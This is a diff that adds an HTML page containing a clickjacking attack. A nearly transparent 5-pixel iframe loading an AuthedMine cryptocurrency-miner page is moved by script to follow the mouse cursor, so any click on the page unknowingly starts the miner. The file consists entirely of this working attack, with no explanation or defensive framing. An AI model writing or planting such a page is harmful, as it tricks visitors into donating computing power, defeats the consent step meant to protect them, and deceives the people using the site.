@@ -1,0 +1,14 @@
+<html>
+  <body>
+    <div id="container" style="border:0;margin:0;position:absolute;width:5px;height:5px;overflow:hidden;cursor:pointer;opacity:0.01">
+      <iframe style="position:absolute;border:0;width:5px;height:100px;top:-85px;cursor:pointer;" src="https://authedmine.com/media/miner.html?key=your_public_key"></iframe>
+    </div>
+  </body>
+
+  <script>
+  window.onmousemove = function(e) {
+    var container = document.getElementById("container");
+    container.setAttribute("style", "border:0;margin:0;position:absolute;width:5px;height:5px;overflow:hidden;cursor:pointer;opacity:0.01;left:" + e.x + ";top:" + e.y);
+  }
+  </script>
+</html>
